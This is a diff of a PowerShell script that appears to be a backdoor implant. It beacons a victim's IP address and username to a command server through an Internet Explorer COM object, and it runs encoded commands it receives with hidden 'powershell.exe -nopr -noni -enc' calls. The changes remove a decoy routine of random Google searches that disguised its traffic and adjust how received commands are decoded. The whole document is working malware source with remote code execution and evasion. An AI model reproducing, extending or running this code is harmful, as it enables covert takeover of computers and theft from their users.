@@ -1,7 +1,6 @@
 $CHUNK_SIZE = 35000;
 $SIZE_LIMIT = 8500000;
 $SRV = '';
-$SEARCH_DICTIONARY = @('bitcoin', 'vacation', 'dancing', 'facebook', 'reddit', 'cat', 'dog', 'gif', 'iphone', 'trump', 'youtube', 'amazon', 'skydiving', 'nfl', 'football', 'basketball');
 
 function get {
   param($ie, $k, $d);
@@ -35,6 +34,7 @@ function run {
     post $ie 'Tx' ($s + '|2') '0';
     if ($type -eq '@') {
       $xc = $buf -join '';
+      $xc = $xc | out-string;
       $r = powershell.exe -nopr -noni -enc $xc;
       if ($r -eq $null) {
         $r = 'NULL';
@@ -74,9 +74,6 @@ while (1) {
     $s = $ip.ipaddress[0] + '|' + $env:USERNAME;
     while (1) {
       run $s $ie;
-      $r1 = Get-Random -InputObject $SEARCH_DICTIONARY;
-      $r2 = Get-Random -InputObject $SEARCH_DICTIONARY;
-      $ie.navigate("https://www.google.com/search?q=$r1+$r2", 14);
       $delay = Get-Random -InputObject 5, 6, 7, 8, 9, 10;
       sleep -seconds $delay;
       $ie.stop();
